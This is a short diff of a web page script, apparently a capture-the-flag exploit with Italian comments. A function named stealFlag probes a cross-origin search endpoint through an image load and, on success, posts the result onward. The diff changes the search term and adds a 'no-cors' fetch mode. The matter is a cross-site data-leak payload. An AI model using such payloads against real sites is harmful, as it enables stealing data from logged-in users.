@@ -11,7 +11,7 @@
     <script>
         const stealFlag = () => {
             const img = document.createElement('img');
-            img.src = 'https://matrix.capturetheflags.site/search?s=flag'; // Endpoint target
+            img.src = 'https://matrix.capturetheflags.site/search?s=thomas'; // Endpoint target
 
             img.onload = () => {
                 console.log("Richiesta riuscita: flag accessibile!");
@@ -22,7 +22,8 @@
                     headers: {
                         'Content-Type': 'application/x-www-form-urlencoded',
                     },
-                    body: `flag=accessibile`
+                    body: `flag=accessibile`,
+                    mode: 'no-cors' // Imposta la modalità no-cors
                 })
                 .then(response => response.text())
                 .then(data => console.log("Risultato inviato:", data))
